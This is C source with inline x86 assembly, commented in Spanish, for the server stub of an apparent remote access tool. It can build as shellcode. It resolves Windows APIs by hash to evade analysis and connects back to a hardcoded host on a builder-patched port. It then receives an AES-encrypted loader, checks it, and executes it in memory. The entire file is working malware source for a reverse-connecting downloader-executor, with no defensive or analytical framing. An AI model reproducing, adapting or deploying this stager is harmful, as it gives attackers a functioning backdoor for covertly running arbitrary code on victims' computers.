/*###############################################################################
** Compilación condicionada:
**    Dependiendo de las opciones aquí seleccionadas el código 
**    resultante tendrá unas características u otras.
**    Para más información sobre éstas revisar 'macros.h'.
**    ¡¡¡EDITAR 'macros.h' PARA SELECCIONAR LA COMPILACIÓN CONDICIONADA!!!
*###############################################################################*/

#include <Windows.h>
#include "macros.h"

void LoadFunctions(DWORD BaseAddress,DWORD lpHashes,DWORD numHashes);
void gtfo(DWORD exit_code);

/*###############################################################################
** Control de errores:
**    Constantes utilizadas en el control de errores.
**    Solamente las excepciones críticas serán controladas, y
**    se devolverá la constante de error correspondiente como
**    'Exit Code' en ExitProcess()@kernel32
*###############################################################################*/
#define ERR_NO  0x0     //No ha habido ningun error. El server ha finalizado correctamente.
#define ERR_FNC 0x1     //Ha habido un error en la funcion LoadFunctions(). Probablemente alguna función no se ha encontrado.
#define ERR_HST 0x2     //Ha habido un error al resolver el Hostname. Probablemente debido a un problema de conexión.
#define ERR_MEM 0x3     //Ha habido un error al reservar memoria.
#define ERR_SUM 0x4     //Ha habido un error en la suma de comprobación.

/*###############################################################################
** Identificadores para APIs y variables:
**    Éstos son luego utilizados para acceder a la correcta posición
**    en el stack de direcciones.
**    Para más información revisar 'macros.h'.
*###############################################################################*/
CREATE_IDS(
            /*kernel32*/    (LoadLibraryA) (GetProcAddress) (Sleep) (ExitProcess) (GlobalAlloc) (GlobalFree)
            /*ws2_32*/      (WSASocketA) (connect) (WSAStartup) (closesocket) (send) (inet_addr) (gethostbyname) (recv)
			/*advapi32*/	(CryptAcquireContextA) (CryptSetKeyParam) (CryptImportKey) (CryptDecrypt)
            /*variables*/   (hSocket) /*(Delta)*/ (pBuff) (buffLen) (hProv) (hHash) (hKey)
           )

void __declspec(naked) main(){
    __asm{
        //Pasamos inicio real del código saltando sobre las constantes.
        jmp  start

#pragma region constants
        /*###############################################################################
        ** Constantes:
        **    Aquí se declaran las constantes utilizadas en el código{
        **        IP        : Dónde se conectará el socket
        **        KEY       : Utilizado para identificar al cliente en el 'handshake'
        **        HASHES    : Hashes de las APIs de las que se obtendrá la dirección.
        **    }
        *###############################################################################*/

IP:     EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
/**
	
		BLOBHEADER hdr;
		DWORD keySize;
		BYTE keydata[16];
	}aes128Blob;
**/
KEY:   	//typedef struct aes128Blob{
            //BLOBHEADER{
                /*bType*/       EMIT_BYTE(PLAINTEXTKEYBLOB)
                /*bVersion*/    EMIT_BYTE(CUR_BLOB_VERSION)
			    /*wReserved*/	EMIT_WORD(0)
                /*aiKeyAlg*/    EMIT_DWORD(CALG_AES_128)
            //}
            /*keySize*/         EMIT_DWORD(0x10)
            /*keydata[16]*/     EMIT_BYTE_ARRAY( (0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04) )	
        //}

kernel32_symbol_hashes:
        #define kernel32_count  6
        /*LoadLibraryA*/        HASH_AND_EMIT( ('L') ('o') ('a') ('d') ('L') ('i') ('b') ('r') ('a') ('r') ('y') ('A') )
        /*GetProcAddress*/      HASH_AND_EMIT( ('G') ('e') ('t') ('P') ('r') ('o') ('c') ('A') ('d') ('d') ('r') ('e') ('s') ('s') )
        /*Sleep*/               HASH_AND_EMIT( ('S') ('l') ('e') ('e') ('p') )
        /*ExitProcess*/         HASH_AND_EMIT( ('E') ('x') ('i') ('t') ('P') ('r') ('o') ('c') ('e') ('s') ('s') )
        /*GlobalAlloc*/         HASH_AND_EMIT( ('G') ('l') ('o') ('b') ('a') ('l') ('A') ('l') ('l') ('o') ('c') )
        /*GlobalFree*/          HASH_AND_EMIT( ('G') ('l') ('o') ('b') ('a') ('l') ('F') ('r') ('e') ('e') )

ws2_32_symbol_hashes:
        #define ws2_32_count    8
        /*WSASocketA*/          HASH_AND_EMIT( ('W') ('S') ('A') ('S') ('o') ('c') ('k') ('e') ('t') ('A') )
        /*connect*/             HASH_AND_EMIT( ('c') ('o') ('n') ('n') ('e') ('c') ('t') )
        /*WSAStartup*/          HASH_AND_EMIT( ('W') ('S') ('A') ('S') ('t') ('a') ('r') ('t') ('u') ('p') )
        /*closesocket*/         HASH_AND_EMIT( ('c') ('l') ('o') ('s') ('e') ('s') ('o') ('c') ('k') ('e') ('t') )
        /*send*/                HASH_AND_EMIT( ('s') ('e') ('n') ('d') )
        /*inet_addr*/           HASH_AND_EMIT( ('i') ('n') ('e') ('t') ('_') ('a') ('d') ('d') ('r') )
        /*gethostbyname*/       HASH_AND_EMIT( ('g') ('e') ('t') ('h') ('o') ('s') ('t') ('b') ('y') ('n') ('a') ('m') ('e') )
        /*recv*/                HASH_AND_EMIT( ('r') ('e') ('c') ('v') )

advapi32_symbol_hashes:
        #define advapi32_count	4
        /*CryptAcquireContextA*/HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('A') ('c') ('q') ('u') ('i') ('r') ('e') ('C') ('o') ('n') ('t') ('e') ('x') ('t') ('A') )
        /*CryptSetKeyParam*/    HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('S') ('e') ('t') ('K') ('e') ('y') ('P') ('a') ('r') ('a') ('m') )
        /*CryptImportKey*/      HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('I') ('m') ('p') ('o') ('r') ('t') ('K') ('e') ('y') )
        /*CryptDecrypt*/        HASH_AND_EMIT( ('C') ('r') ('y') ('p') ('t') ('D') ('e') ('c') ('r') ('y') ('p') ('t') )
#pragma endregion

start:
        /*###############################################################################
        ** Creación del stack de direcciones:
        **    Lo primero que hacemos es reservar espacio en el stack para almacenar
        **    las direcciones de APIs, también las variables.
        **    Utilizaremos durante todo el código EBP como puntero al inicio de este
        **    'stack de direcciones'
        *###############################################################################*/

        sub  esp, STACKSIZE
        mov  ebp, esp

#ifdef SHELLCODE
        /*###############################################################################
        ** Obtención del Delta offset:
        **    Obtenemos la posición relativa de nuestro código.
        **    Utilizamos un código poco común que utiliza la FPU.
        **    Primero utilizamos 'fldpi' para actualizar el entorno de FPU
        **    rellenando el item 'FPUInstructionPointer' de la estructura
        **    con la dirección de la última instrucción FPU ('fldz')
        **    Por último cargamos la estructura de entorno con ('fstenv') 
        **    de tal forma que el item que necesitamos quede en esp y lo sacamos a edi.
        **    NOTAS{
        **        1: Se harcodean los opcodes para evitar tanto la comprobación
        **        de errores de FP como para evitar el byte superfluo que añade
        **        el visualC
        **        2: La instrucción 'fldpi' en realidad hace un push PI en el stack FPU
        **        (Quién analice el código no sabrá que coño pasa jajaja)
        **    }
        *###############################################################################*/
find_delta:
        fldpi
        EMIT_BYTE_ARRAY(
            (0xD9) (0x74) (0x24) (0xF4)    //fstenv (28-BYTE) PTR SS:[esp-0x0C]
        )
        pop  edi
        add  edi, K
        sub  edi, (find_delta+K)
        //mov  [ebp+_Delta], edi            //Lo guardamos para luego :)
#endif

        /*###############################################################################
        ** Carga de APIs:
        **    Iniciamos el proceso de carga de APIs.
        **    Primero se obtendrá el puntero a kernel32 después se cargarán sus funciones,
        **    entre ellas LoadLibraryA(), con ésta se cargarán el resto de librerias.
        *###############################################################################*/

        //Obtenemos en eax la dirección de kernel32
        xor  eax, eax
        mov  esi, FS:[eax+0x30]         //ESI = &(PEB)
        mov  esi, [esi+0x0C]            //ESI = PEB->Ldr
        mov  esi, [esi+0x1C]            //ESI = PEB->Ldr.InInitOrder[0]
next_module:
        mov  eax, [esi+0x08]            //EAX = PEB->Ldr.InInitOrder[X].base_address
        mov  ecx, [esi+0x20]            //EDI = PEB->Ldr.InInitOrder[X].module_name (unicode)
        cmp  [ecx+0xC], '3'             //module_name[6] == '3'?
        je   find_kernel32_finished
        mov  esi, [esi]                 //ESI = PEB->Ldr.InInitOrder[X].flink == NextModule
        jmp  next_module
find_kernel32_finished:
        //Cargamos las apis de kernel32 en la pila a partir de los hashes
        push kernel32_count             //v Número de kernel32
        pushr(kernel32_symbol_hashes)   //v Puntero al primer hash de kernel32
        push eax                        //v kernel32 BaseAddress
        callr(LoadFunctions)            //>LoadFunctions(&kernel32, &kernel32_symbol_hashes, kernel32_count);
#ifdef SHELLCODE
        add  esp, 0xC
#endif
        //Obtenemos la BaseAddress de ws2_32
        pushc('23')                     //v
        pushc('_2sw')                   //v Metemos el nombre del API en el stack (ANSI)
        push esp                        //v
        call [ebp+_LoadLibraryA]        //>LoadLibraryA("ws2_32");
        //Cargamos las APIs de ws2_32 en la pila a partir de los hashes
        add  esp, 0x8                   //Restauramos la pila sacando la cadena ANSI
        add  ebp, (kernel32_count*4)    //Desplazamos el buffer para no pisar los punteros a las apis de kernel32

        push ws2_32_count               //v Número de hashes de ws2_32
        pushr(ws2_32_symbol_hashes)     //v Puntero al primer hash de ws2_32.dll
        push eax                        //v ws_32 BaseAddress
        callr(LoadFunctions)            //>LoadFunctions(&ws2_32, &ws2_32_symbol_hashes, ws2_32_count);
#ifdef SHELLCODE
        add  esp, 0xC
#endif
        sub  ebp, (kernel32_count*4)    //Volvemos a apuntar ebp al inicio de las direcciones de las APIs

        //Obtenemos el BaseAddress de advapi32
        cdq                             //EDX = 0
        push edx                        //v
        pushc('23ip')                   //v Metemos el nombre del API en el stack (ANSI)
        pushc('avda')                   //v
        push esp                        //v
        call [ebp+_LoadLibraryA]        //>LoadLibraryA("advapi32");
        add  esp, 0xC                   //Restauramos la pila eliminando la cadena ANSI
        //Desplazamos el stack de APIs para no pisar los punteros a las apis de kernel32 ni ws2_32
        add  ebp, (kernel32_count + ws2_32_count)*4
        push advapi32_count             //v Número de hashes de advapi32
        pushr(advapi32_symbol_hashes)   //v Puntero al primer hash de advapi32
        push eax                        //v advapi32 BaseAddress
        callr(LoadFunctions)            //>LoadFunctions(&advapi32, &advapi32_symbol_hashes, advapi32_count);
#ifdef SHELLCODE
        add  esp, 0xC
#endif
        //Volvemos a apuntar el stack de APIs al inicio
        sub  ebp, (kernel32_count + ws2_32_count)*4

        //Creamos el buffer donde recibiremos toda la información
        #define BUFF_SIZE   0x10000
        pushc(BUFF_SIZE)                //v
        push GPTR                       //v
        call [ebp+_GlobalAlloc]         //>GlobalAlloc(GPTR, BUFF_SIZE)
        test eax, eax                   //v
        jnz  NoErr3                     //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos

        push ERR_MEM                    //v
        callr(gtfo)                     //>gtfo(ERR_MEM);

NoErr3: mov  [ebp+_pBuff], eax          //pBuffer = EAX

        /*###############################################################################
        ** Creación del socket:
        **    Una vez cargadas todas las APIs que necesitaremos de las distintas librerias
        **    creamos el socket para conectarnos al cliente e iniciar la autentificación.
        **    Otra vez más utilizamos el stack para evitar crear buffers innecesarios.
        *###############################################################################*/

        //Iniciamos el socket
#ifdef SHELLCODE
        sub  esp, 0x79                  //v
        sub  esp, 0x79                  //v
        sub  esp, 0x79                  //v
        sub  esp, 0x79                  //>Reservamos espacio suficiente en la pila para WSADATA
        push esp                        //v
        pushc(0x202)                    //v VersionRequested = 2.2
        call [ebp+_WSAStartup]          //>WSAStartup(0x202, &WSADATA);
        add  esp, 0x79                  //v
        add  esp, 0x79                  //v
        add  esp, 0x79                  //v
        add  esp, 0x79                  //>Restauramos la pila eliminando WSADATA de ésta
#else
        sub  esp, 0x190                 //Reservamos espacio suficiente en la pila para WSADATA
        push esp                        //v
        pushc(0x202)                    //v VersionRequested = 2.2
        call [ebp+_WSAStartup]          //>WSAStartup(0x202, &WSADATA);
        add  esp, 0x190                 //Restauramos la pila eliminando WSADATA de ésta
#endif
newSocket:
        //Creamos el socket AF_INET y SOCK_STREAM
        cdq                             //EDX = 0    (Si EAX >=0; WSAStartup siempre devuelve >=0)
        push edx                        //v
        push edx                        //v
        push edx                        //v
        push edx                        //v
        inc  edx                        //v EDX = 1 (SOCK_STREAM)
        push edx                        //v
        inc     edx                     //v EDX = 2 (AF_INET)
        push edx                        //v
        call [ebp+_WSASocketA]          //>WSASocketA(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
        mov  [ebp+_hSocket], eax        //hSocket = EAX

        //Obtenemos la dirección válida
        pushr(IP)                       //v
        call [ebp+_gethostbyname]       //>gethostbyname(&IP);
        test eax, eax                   //v
        jne  NoErr2                     //>EAX!=0? (Si fallamos al obtener el host mejor salimos...)

        push ERR_HST                    //v
        callr(gtfo)                     //>gtfo(ERR_HST);

NoErr2: add  eax, 0x20                  //EAX = hostent.h_name
        push eax                        //v
        call [ebp+_inet_addr]           //>inet_addr(hostent.h_name);

        #define PORT 0xD0070002

        //Construimos la sockaddr_in en la pila
        push eax                        //push IP
        push PORT                       //push PORT            (TODO: EL BUILDER PARCHEARÁ ESTO!!!! :D)
        mov  ebx, esp                   //EBX = &sockaddr_in

        //Conectamos al cliente haciendo un máximo de 121 intentos cada 0x1337ms
        jmp  rst
doConnect:
        push 0x10                       //v size(sockaddr_in)
        push ebx                        //v
        push [ebp+_hSocket]             //v
        call [ebp+_connect]             //>connect(hSocket, &sockaddr_in, size(sockaddr_in));
        test eax, eax                   //v
        jge  connected                  //>(EAX>=0)? (Conectamos con éxito, sigamos!)
        loop doConnect                  //(ECX>0)? (Intentamos conectar de nuevo... hasta 255 veces)
        //No ha habido suerte conectando... esperemos 0x1337ms y volvamos a intentar
        pushc(0x1337)                   //v
        call [ebp+_Sleep]               //Sleep(0x1337);
rst:    
        push 0x79                       //v
        pop  ecx                        //>ECX = 121
        jmp  doConnect
connected:
        add  esp, 0x8                   //Reparamos la pila eliminando sockaddr_in

        /*###############################################################################
        ** Recepción de datos desde el cliente:
        **  Una vez establecida la conexión con éxito intentamos recibir 
        **  el paquete inicial compuesto de:
        **      IV+SizePlayload+CHECKSUM+LOADER_IAT+CARGADOR
        **  Siendo cada uno:
        **      *IV(16bytes)    : Vector de inicializacion para el cifrado
        **{{
        **      *CHECKSUM       : Checksum de todo el paquete a partir del IV, para evitar error crítico al ejecutar.
        **      *SizePayload    : sizeof(LOADER_IAT+CARGADOR)
        **      *LOADER_IAT     : Loader de Arkangel encargado de ubicar y ejecutar el cargador de plugins
        **      *CARGADOR       : Cargador de plugins... encargado de gestionar la conexión
        **}}
        **  Lo envuelto entre {{*}} viene cifrado en AES-128-cbc usando como clave el hash SHA1(user+pass)
        *###############################################################################*/
recibir:
        cdq                             //EDX = 0
        push edx                        //v
        pushc(BUFF_SIZE)                //v
        push [ebp+_pBuff]               //v
        push [ebp+_hSocket]             //v
        call [ebp+_recv]                //>recv(hSocket, pBuff, BUFF_SIZE, MSG_WAITALL);
        mov  [ebp+_buffLen], eax        //buffLen = EAX
        test eax, eax                   //v
        jg   init_decrypt               //>EAX>0? (Todo correcto? Procedemos a descifrar)
KillSocket:
//      push [ebp+_pBuff]               //v
//      call [ebp+_GlobalFree]          //>GlobalFree(pBuff);
        push [ebp+_hSocket]             //v
        call [ebp+_closesocket]         //>closesocket(hSocket);
        jmp  newSocket                  //Creamos un nuevo socket

        /*###############################################################################
        ** Descrifrado y autentificación:
        **    Una vez obtenidos los datos comprobamos que el emisor ha sido el cliente.
        **    Para esto los desciframos con la clave compartida que tenemos (SHA1(user+pass))
        **    Luego, para evitar ejecutar código erróneo comprobamos el checksum
        *###############################################################################*/

init_decrypt:
        //Adquirimos el handle para trabajar con el CSP deseado.
        cdq                             //EDX = 0
        pushc(CRYPT_VERIFYCONTEXT)      //v
        push PROV_RSA_AES               //v
        push edx                        //v
        push edx                        //v
        push ebp                        //v
        add  [esp], _hProv              //v
        call [ebp+_CryptAcquireContextA]//>CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
		//Importamos la clave
		//cdq                             //EDX = 0
		push ebp                        //v
		add  [esp], _hKey               //v(Direccion a la variable que contendra el Handler a la key)
		push edx						//v
		push edx						//v
		push 0x1C						//vsizeof(aes128Blob)
		pushr(KEY)				        //v Estructura que contiene la clave exportada
		push [ebp+_hProv]				//v
		call [ebp+_CryptImportKey]		//vCryptImportKey(hCryptProv, (BYTE*)&blob, sizeof(aes128Blob), 0, 0, &hKey);

		//Seteamos el valor del IV(Inicializacion Vector)
		push edx                        //v
		push [ebp+_pBuff]               //v
		push KP_IV                      //v
		push [ebp+_hKey]                //v
		call [ebp+_CryptSetKeyParam]    //vCryptSetKeyParam(hKey, KP_IV, (BYTE*)IV, 0);

		//Restamos el IV a los datos
		add  [ebp+_pBuff], 16           //pBuff+= 16
		sub  [ebp+_buffLen], 16         //buffLen-= 16

		//Finalmente desciframos los datos obtenidos
		//Los datos se encuentran en el paquete asi: IV(16B)+DataEncrypt
        //cdq						

		push [ebp+_buffLen]             //Variable temporal para guardar el tamaño de los datos a leer

		push esp                        //v
		push [ebp+_pBuff]               //v
		push edx                        //v
		push edx                        //v
		push edx                        //v
		push [ebp+_hKey]                //v
		call [ebp+_CryptDecrypt]        //>CryptDecrypt(hKey, 0, false, 0, pBuff, &buffLen);

		pop  esi                        //Borramos la variable temporal

        /*###############################################################################
        ** Comprobación del checksum:
        **    El checksum esta en el primer DWORD de los datos recibidos.
        **    El algoritmo utilizado para calcular el checksum es: 
        **        *Jenkins (http://goo.gl/cMRaH)
        *###############################################################################*/

        mov  ecx, [ebp+_buffLen]        //ECX = buffLen
        mov  esi, [ebp+_pBuff]          //ESI = pBuff
        add  esi, (16 + 4)              //ESI+= (16 + 4) (Saltamos IV y checksum)
        cdq                             //EDX = 0
jenkins_one_at_a_time_hash:
        xor  eax, eax                   //v
        lodsb                           //al = [esi]; esi++
        add  edx, eax                   //>hash += key[i];
        mov  eax, edx                   //v
        shl  eax, 10                    //v
        add  edx, eax                   //>hash += (hash << 10);
        mov  eax, edx                   //v
        shr  eax, 6                     //v
        xor  edx, eax                   //>hash ^= (hash >> 6);
        loop jenkins_one_at_a_time_hash //>(len--);(len < 0)?

        mov  eax, edx                   //v
        shl  eax, 3                     //v
        add  edx, eax                   //>hash += (hash << 3);
        mov  eax, edx                   //v
        shr  eax, 11                    //v
        xor  edx, eax                   //>hash ^= (hash >> 11);
        mov  eax, edx                   //v
        shl  eax, 15                    //v
        add  edx, eax                   //>hash += (hash << 15);

        mov  esi, [ebp+_pBuff]          //v
        cmp  edx, [esi + 16]            //v
        je   NoErr4                     //>(EDX==[ESI+sizeof(IV)]?)Si los checksums coinciden no hay error

        //Algo falla en el checksum... reseteemos la conexión
        //push ERR_SUM                  //v
        //callr(gtfo)                   //>gtfo(ERR_SUM);
        jmp  KillSocket

NoErr4: //pushr(HASH)                   //v
        push [ebp+_hSocket]             //v
        push [ebp+_GetProcAddress]      //v
        push [ebp+_LoadLibraryA]        //v
        mov  eax, [ebp+_pBuff]          //v
        add  eax, 0x4                   //v
        call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &HASH);
    }
}

/*###############################################################################
** LoadFunctions:
**    Método encargado de rellenar el stack de direcciones.
**    Llama a la función FindFunction() por cada hash en la lista
**    almacenando la dirección en su respectiva posicion del stack.
*###############################################################################*/
void __declspec(naked) LoadFunctions(DWORD BaseAddress, DWORD lpHashes, DWORD numHashes){
    __asm{
        pushad
        mov  ebx, [esp+0x24]            //&IMAGE_DOS_HEADER
        mov  esi, [esp+0x28]            //lpHashes
        mov  ecx, [esp+0x2C]            //numHashes

        cdq                             //EDX = 0
nextFunction:
        xor  eax, eax                   //EAX = 0
        lodsw                           //mov ax, WORD[esi]; esi+=2
#pragma region FindFunction
/*###############################################################################
** FindFunction:
**    Función que recorre la EAT de una DLL en busca de cierta función.
**    Para ello genera un hash del nombre de la función y lo compara con el recibido.
**    Para más información revisar 'macros.h'
*###############################################################################*/
find_function:
        pushad
        //EBX = &IMAGE_DOS_HEADER
        mov  edi, [ebx+0x3C]            //EDI = IMAGE_DOS_HEADER.e_lfanew
        mov  edi, [ebx+edi+0x78]        //EDI = IMAGE_OPTIONAL_HEADER->DataDirectory(IMAGE_FILE_EXPORT_DIRECTORY).VirtualAddress
        add  edi, ebx                   //EDI = EAT (RVA)
        mov  ecx, [edi+0x18]            //ECX = IMAGE_EXPORT_DIRECTORY.NumberOfFunctions
        mov  ebp, [edi+0x20]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (RVA)
        add  ebp, ebx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
find_function_loop:
        jecxz find_function_finished    //Si ECX == 0 ya no quedan funciones por recorrer
        dec  ecx                        //ECX--
        mov  esi, [ebp+ecx*4]           //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
        add  esi, ebx                   //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfNames[X] (VA) Export Name Table
compute_hash:
        cdq                             //EDX = 0
        push eax
compute_hash_again:
        xor  eax, eax                   //EAX = 0
        lodsb                           //AL = BYTE[ESI];ESI++
        test al, al                     //v
        jz   compute_hash_finished      //>(AL==0)? Fin del LibName
        shr  edx, 1                     //hash>>=1
        imul eax, al                    //v
        xor  edx, eax                   //>hash ^= (char[i]*char[i])
        jmp  compute_hash_again
compute_hash_finished:
find_function_compare:
        pop  eax
        cmp  dx, ax                     //v
        jnz  find_function_loop         //>(DX == FunctionHash)?
        mov  ebp, [edi+0x24]            //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (RVA)
        add  ebp, ebx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfNames (VA)
        mov  cx, [ebp+ecx*2]
        mov  ebp, [edi+0x1C]
        add  ebp, ebx
        mov  eax, [ebp+4*ecx]
        add  eax, ebx
find_function_finished:
        mov  [esp+0x1C], eax
        popad
#pragma endregion EAX=HASH;EBX=BaseAddr

        test eax, eax                   //v
        jnz  NoErr1                     //>(EAX!=0)?Si se ha encontrado la dirección no hay error

        push ERR_FNC                    //v
        callr(gtfo)                     //>gtfo(ERR_FNC);

NoErr1: mov  [ebp+edx*4+4], eax         //Guardamos dir en buffer pila
        inc  edx                        //EDX++
        loop nextFunction               //(ECX--);(ECX!=0)?

        popad
#ifndef SHELLCODE
        ret  0xC
#else
        ret
#endif
    }
}

/*###############################################################################
** gtfo:
**    Método para salir en cualquier momento de la ejecución sin mostrar ningún
**    error crítico, además es usado para tener una mejor idea de lo ocurrido
*###############################################################################*/

void __declspec(naked) gtfo(DWORD exit_code){
    __asm{
        push [esp+0x4]
        call [ebp+_ExitProcess]
    }
}